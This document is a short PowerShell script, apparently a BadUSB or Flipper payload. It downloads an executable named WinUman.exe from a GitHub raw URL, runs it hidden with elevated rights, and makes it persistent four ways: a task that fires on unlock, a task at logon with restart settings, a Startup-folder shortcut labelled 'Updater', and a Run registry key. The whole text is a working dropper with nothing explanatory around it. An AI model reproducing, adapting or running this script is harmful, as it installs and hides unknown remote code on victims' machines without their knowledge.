$u = "$env:APPDATA\WinUman.exe"
(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinUman.exe", $u)
Start-Process -Fi $u -Verb RunAs -WindowStyle Hidden

$esc = $u -replace '\\','\\\\'
iex "schtasks /Create /F /TN WinUmanUnlock /TR $esc /SC ONUNLOCK /RL HIGHEST /RU $env:USERNAME"

$a = New-ScheduledTaskAction -Execute $u
$l = New-ScheduledTaskTrigger -AtLogOn
$sT = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable
$pC = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
$t = New-ScheduledTask -Action $a -Trigger $l -Settings $sT -Principal $pC
Register-ScheduledTask -TaskName "WinUmanResilient" -InputObject $t -Force

$w = New-Object -ComObject WScript.Shell
$s = $w.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinUman.lnk")
$s.TargetPath = $u
$s.WorkingDirectory = Split-Path $u
$s.WindowStyle = 7
$s.Description = "Updater"
$s.Save()

Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUman" -Value $u
